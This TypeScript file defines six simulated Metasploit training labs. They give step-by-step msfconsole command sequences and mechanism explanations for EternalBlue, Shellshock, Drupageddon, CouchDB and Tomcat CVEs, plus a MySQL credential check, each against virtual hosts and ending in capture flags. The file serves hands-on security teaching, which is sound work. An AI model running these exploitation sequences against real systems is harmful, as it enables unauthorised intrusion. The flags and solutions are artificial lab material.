import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Metasploit Framework lab pack #3 — six more labs on the real `msfconsole` mechanic (`msfconsole` ->
 *  `search`/`use` -> `set` -> `show options` -> `run`/`exploit`), not the one-line `exploit <shortname> <ip>`
 *  shortcut. Two of these six deliberately revisit techniques this platform already has a lab for via a
 *  DIFFERENT mechanic — EternalBlue (existing shortcut-based `eternalblue-smb-rce`) and CouchDB (existing
 *  curl-based "Admin Party" misconfig lab) — each explicitly differentiated in its briefing rather than left
 *  implicit, the same convention already established for the WPA2 handshake-capture pair in batch 22. */
export const metasploitLabs3: LabScenario[] = [
  // 1 — EternalBlue via the real msfconsole workflow (distinct from the existing shortcut-based lab)
  {
    id: 'msf-eternalblue-ms17-010-real-console',
    title: 'Metasploit: EternalBlue (MS17-010) — the Real msfconsole Workflow',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'legacy-fileserver04 (10.10.73.10) is a second, distinct EternalBlue target from this platform\'s ' +
      'existing `eternalblue-smb-rce` lab — that one is solved via the older one-line `exploit <name> <ip>` ' +
      'shortcut; this one teaches the real, literal `msfconsole` sequence operators actually type. Same ' +
      'famous NSA-developed SMBv1 kernel-pool-corruption exploit, later leaked and weaponized in WannaCry and ' +
      'NotPetya — different mechanic, real commands both times.',
    objectives: [
      { text: 'nmap -sV 10.10.73.10', why: 'Confirms an old, unpatched SMBv1 version banner before ever touching msfconsole.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/windows/smb/ms17_010_eternalblue', why: 'The real, specific MS17-010 module.' },
      { text: 'set RHOSTS 10.10.73.10', why: 'RPORT already defaults to 445, the real value — RHOSTS is the only thing missing.' },
      { text: 'run', why: 'The real module defaults to anonymous SMB login and needs no credentials at all — the SMBv1 kernel-pool-corruption bug itself is the entire vulnerability.' },
      { text: 'cat /root/root.txt', why: 'Confirms the resulting session is SYSTEM, the highest privilege on Windows, granted directly with no separate privilege-escalation phase.' },
    ],
    hints: [
      'nmap -sV 10.10.73.10',
      'msfconsole',
      'use exploit/windows/smb/ms17_010_eternalblue',
      'set RHOSTS 10.10.73.10',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'legacy-fileserver04',
        ip: '10.10.73.10',
        os: 'Windows 7 SP1 (SMBv1 enabled, unpatched for MS17-010)',
        services: [{ port: 445, name: 'smb', version: 'Windows SMBv1 (MS17-010 unpatched)' }],
        users: [],
        metasploitModule: {
          path: 'exploit/windows/smb/ms17_010_eternalblue',
          requiredOptions: [],
          defaultOptions: { RPORT: '445' },
        },
        root: dir({
          root: dir({
            'root.txt': file('EternalBlue (MS17-010) confirmed via the real msfconsole workflow — SYSTEM granted directly via SMBv1 kernel-pool corruption.\nflag{eternalblue_ms17_010_real_msfconsole_workflow}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 2 — Shellshock (CVE-2014-6271) via a CGI script
  {
    id: 'msf-shellshock-apache-mod-cgi-bash-env',
    title: 'Metasploit: Shellshock — Bash Environment-Variable Code Injection (CVE-2014-6271)',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'legacy-cgi-web01 (10.10.73.11) runs an Apache server with a CGI script that shells out to bash. ' +
      'CVE-2014-6271 ("Shellshock") is a flaw in how bash parses environment variables: a specially-crafted ' +
      'function definition in an env var is followed by extra shell commands that bash executes immediately ' +
      'on STARTUP, before the script it was invoked for ever runs. The real module weaponizes this by setting ' +
      'the malicious payload as the HTTP User-Agent header — CGI passes HTTP headers into environment ' +
      'variables by design, handing the attacker\'s payload straight to the vulnerable bash parser.',
    objectives: [
      { text: 'nmap -sV 10.10.73.11', why: 'Confirms the Apache/CGI service is exposed.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/multi/http/apache_mod_cgi_bash_env_exec', why: 'The real, specific Shellshock module.' },
      { text: 'set RHOSTS 10.10.73.11', why: 'RPORT (80) and TARGETURI already default correctly for this instance\'s CGI script path.' },
      { text: 'run', why: 'Sends the malicious function-definition payload via the User-Agent header — CGI hands it straight into an environment variable, and bash executes the trailing command on startup before the CGI script itself ever runs.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.73.11',
      'msfconsole',
      'use exploit/multi/http/apache_mod_cgi_bash_env_exec',
      'set RHOSTS 10.10.73.11',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'legacy-cgi-web01',
        ip: '10.10.73.11',
        os: 'Linux (Apache + mod_cgi, unpatched bash, vulnerable to CVE-2014-6271)',
        services: [{ port: 80, name: 'http', version: 'Apache mod_cgi — /cgi-bin/status (unpatched bash, Shellshock)' }],
        users: [],
        metasploitModule: {
          path: 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
          requiredOptions: [],
          defaultOptions: { RPORT: '80', TARGETURI: '/cgi-bin/status' },
        },
        root: dir({
          root: dir({
            'root.txt': file('Shellshock (CVE-2014-6271) confirmed -- a crafted User-Agent header became an environment variable bash executed on startup.\nflag{shellshock_apache_mod_cgi_bash_env_cve_2014_6271}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 3 — Drupageddon SQL injection to RCE (CVE-2014-3704)
  {
    id: 'msf-drupageddon-sqli-rce',
    title: 'Metasploit: Drupageddon — Drupal HTTP Parameter SQL Injection to RCE (CVE-2014-3704)',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'community-drupal01 (10.10.73.12) runs an unpatched Drupal 7 install. CVE-2014-3704 — nicknamed ' +
      '"Drupageddon" — is a SQL injection reachable through Drupal\'s own database abstraction layer via ' +
      'crafted array-style HTTP parameter keys, requiring no authentication at all. The real module chains ' +
      'the injection two steps further than a typical SQLi: it plants malicious PHP into Drupal\'s own form ' +
      'cache via the injection, then triggers Drupal to load and execute that cached value as real PHP code.',
    objectives: [
      { text: 'nmap -sV 10.10.73.12', why: 'Confirms the Drupal-fronted HTTP service and version.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/multi/http/drupal_drupageddon', why: 'The real, specific CVE-2014-3704 module.' },
      { text: 'set RHOSTS 10.10.73.12', why: 'RPORT (80) and TARGETURI (/) already default correctly for this instance.' },
      { text: 'run', why: 'Injects via a crafted parameter key with no authentication, plants PHP into Drupal\'s own form cache via the SQLi, then triggers Drupal to execute that cached value as code.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.73.12',
      'msfconsole',
      'use exploit/multi/http/drupal_drupageddon',
      'set RHOSTS 10.10.73.12',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'community-drupal01',
        ip: '10.10.73.12',
        os: 'Linux (Drupal 7.31, unpatched for CVE-2014-3704)',
        services: [{ port: 80, name: 'http', version: 'Drupal 7.31 — vulnerable to Drupageddon' }],
        users: [],
        metasploitModule: {
          path: 'exploit/multi/http/drupal_drupageddon',
          requiredOptions: ['TARGETURI'],
          defaultOptions: { RPORT: '80', TARGETURI: '/' },
        },
        root: dir({
          root: dir({
            'root.txt': file('Drupageddon (CVE-2014-3704) confirmed -- unauthenticated SQLi planted PHP into Drupal\'s own form cache, then triggered its execution.\nflag{drupageddon_sqli_form_cache_rce_cve_2014_3704}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 4 — CouchDB privilege-escalation-to-RCE (CVE-2017-12635 / CVE-2017-12636), distinct from the existing Admin Party misconfig lab
  {
    id: 'msf-couchdb-cve-2017-12635-12636-privesc-rce',
    title: 'Metasploit: CouchDB Non-Admin Privilege Escalation to RCE (CVE-2017-12635/12636)',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'metrics-couchdb02 (10.10.73.13) is a DIFFERENT CouchDB vulnerability from this platform\'s existing ' +
      '"Admin Party" lab — that one exploits a server with NO admin account configured at all; this one has ' +
      'an admin account properly configured, but is still exploitable by a completely unprivileged, non-' +
      'admin user. CVE-2017-12635 abuses a type-confusion in how CouchDB\'s Erlang backend and JavaScript-' +
      'facing API validate user roles (sending a JSON array instead of a string bypasses the check),' +
      ' letting a non-admin grant themselves admin rights; CVE-2017-12636 then lets that now-admin account ' +
      'configure a malicious Erlang query server, achieving full command execution.',
    objectives: [
      { text: 'nmap -sV 10.10.73.13', why: 'Confirms CouchDB is exposed on its standard port 5984.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/linux/http/apache_couchdb_cmd_exec', why: 'The real, specific module chaining CVE-2017-12635 and CVE-2017-12636.' },
      { text: 'set RHOSTS 10.10.73.13', why: 'Target host — this module needs no admin credentials, since the whole point is escalating from zero privilege.' },
      { text: 'run', why: 'Chains both CVEs automatically: the role-validation type confusion self-grants admin, then the newly-admin account configures a malicious Erlang query server that executes arbitrary OS commands.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution, starting from a completely unprivileged, non-admin request.' },
    ],
    hints: [
      'nmap -sV 10.10.73.13',
      'msfconsole',
      'use exploit/linux/http/apache_couchdb_cmd_exec',
      'set RHOSTS 10.10.73.13',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'metrics-couchdb02',
        ip: '10.10.73.13',
        os: 'Linux (Apache CouchDB, admin account configured, unpatched for CVE-2017-12635/12636)',
        services: [{ port: 5984, name: 'http', version: 'Apache CouchDB — admin configured, vulnerable to role-validation type confusion' }],
        users: [],
        metasploitModule: {
          path: 'exploit/linux/http/apache_couchdb_cmd_exec',
          requiredOptions: [],
          defaultOptions: { RPORT: '5984' },
        },
        root: dir({
          root: dir({
            'root.txt': file('CVE-2017-12635/12636 chained -- a non-admin self-granted admin via a role-validation type confusion, then RCE via a malicious Erlang query server.\nflag{couchdb_role_validation_type_confusion_privesc_rce}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 5 — Tomcat PUT-method JSP upload bypass (CVE-2017-12617), distinct from tomcat_mgr_upload's credentialed Manager deploy
  {
    id: 'msf-tomcat-jsp-upload-bypass-cve-2017-12617',
    title: 'Metasploit: Tomcat PUT-Method JSP Upload Bypass — Unauthenticated (CVE-2017-12617)',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'app-tomcat05 (10.10.73.14) is misconfigured with its DefaultServlet readonly flag set to false — a ' +
      'setting meant to allow WebDAV-style file editing. CVE-2017-12617 abuses this directly: an HTTP PUT ' +
      'request can upload a raw .jsp file to the webroot with NO authentication required at all, unlike this ' +
      'platform\'s existing `tomcat_mgr_upload` lab, which needs a valid Manager-application login first. ' +
      'Once the .jsp file lands on disk, requesting it directly executes it exactly like any other JSP page.',
    objectives: [
      { text: 'nmap -sV 10.10.73.14', why: 'Confirms Tomcat is exposed on its standard port 8080.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use exploit/multi/http/tomcat_jsp_upload_bypass', why: 'The real, specific CVE-2017-12617 module — deliberately distinct from the credentialed `tomcat_mgr_upload` module used elsewhere on this platform.' },
      { text: 'set RHOSTS 10.10.73.14', why: 'RPORT (8080) and TARGETURI (/) already default correctly.' },
      { text: 'run', why: 'PUTs a raw .jsp payload directly to the webroot with no authentication at all, then requests it to trigger execution.' },
      { text: 'cat /root/root.txt', why: 'Confirms code execution.' },
    ],
    hints: [
      'nmap -sV 10.10.73.14',
      'msfconsole',
      'use exploit/multi/http/tomcat_jsp_upload_bypass',
      'set RHOSTS 10.10.73.14',
      'run',
      'cat /root/root.txt',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'app-tomcat05',
        ip: '10.10.73.14',
        os: 'Linux (Apache Tomcat, DefaultServlet readonly=false, unpatched for CVE-2017-12617)',
        services: [{ port: 8080, name: 'http', version: 'Apache Tomcat — DefaultServlet readonly=false' }],
        users: [],
        metasploitModule: {
          path: 'exploit/multi/http/tomcat_jsp_upload_bypass',
          requiredOptions: ['TARGETURI'],
          defaultOptions: { RPORT: '8080', TARGETURI: '/' },
        },
        root: dir({
          root: dir({
            'root.txt': file('CVE-2017-12617 confirmed -- an unauthenticated HTTP PUT uploaded a raw .jsp payload directly to the webroot.\nflag{tomcat_jsp_upload_bypass_unauthenticated_put_cve_2017_12617}\n'),
          }),
        }),
      } as HostDef,
    ],
  },

  // 6 — auxiliary/scanner/mysql/mysql_login, third auxiliary flavor: database credential confirmation
  {
    id: 'msf-auxiliary-mysql-login-credential-confirmation',
    title: 'Metasploit: auxiliary/scanner/mysql/mysql_login — Confirming Database Credentials',
    difficulty: 'Easy',
    category: 'Network',
    briefing:
      'A recon pass against db-analytics03 turned up an exposed MySQL service and a candidate root password ' +
      'from a leaked config file. `auxiliary/scanner/mysql/mysql_login` is the real, dedicated module for ' +
      'confirming exactly this kind of finding — testing MySQL credentials without opening any kind of ' +
      'session at all, the same "cheap validation before a noisier step" pattern already covered by this ' +
      'platform\'s SSH-login auxiliary lab, applied here to a database service instead.',
    objectives: [
      { text: 'cat leaked-db-config.txt', why: 'A leaked configuration file already surfaced a candidate root credential worth confirming against the live service.' },
      { text: 'msfconsole', why: 'Real msfconsole session.' },
      { text: 'use auxiliary/scanner/mysql/mysql_login', why: 'The real, dedicated MySQL credential-confirmation module — an AUXILIARY module, not an exploit, so no session ever opens.' },
      { text: 'set RHOSTS 10.10.73.15', why: 'Target host.' },
      { text: 'set USERNAME root', why: 'The candidate username from the leaked config.' },
      { text: 'set PASSWORD Analytics_DB_2024', why: 'The candidate password from the same leaked config.' },
      { text: 'run', why: 'Confirms the credential directly against the live MySQL service and prints the result — no session opens, no query runs, just a confirmed-valid/invalid answer.' },
    ],
    hints: [
      'cat leaked-db-config.txt',
      'msfconsole',
      'use auxiliary/scanner/mysql/mysql_login',
      'set RHOSTS 10.10.73.15',
      'set USERNAME root',
      'set PASSWORD Analytics_DB_2024',
      'run',
    ],
    totalFlags: 1,
    attacker: attacker({
      'leaked-db-config.txt': file(
        'Config file recovered from an exposed backup archive:\n' +
          '  db_host=10.10.73.15\n  db_user=root\n  db_pass=Analytics_DB_2024\n' +
          '  -- not yet confirmed against the live service --\n',
      ),
    }),
    network: [
      {
        hostname: 'db-analytics03',
        ip: '10.10.73.15',
        os: 'Linux (MySQL database server)',
        services: [{ port: 3306, name: 'mysql', version: 'MySQL 8.0' }],
        users: [],
        metasploitModule: {
          path: 'auxiliary/scanner/mysql/mysql_login',
          requiredOptions: ['USERNAME', 'PASSWORD'],
          defaultOptions: { RPORT: '3306' },
          scanOutput:
            '[+] 10.10.73.15:3306 - Success: \'root:Analytics_DB_2024\' (credential confirmed valid against the live MySQL service)\n' +
            'flag{auxiliary_mysql_login_database_credential_confirmed}',
        },
        root: dir({}),
      } as HostDef,
    ],
  },
];
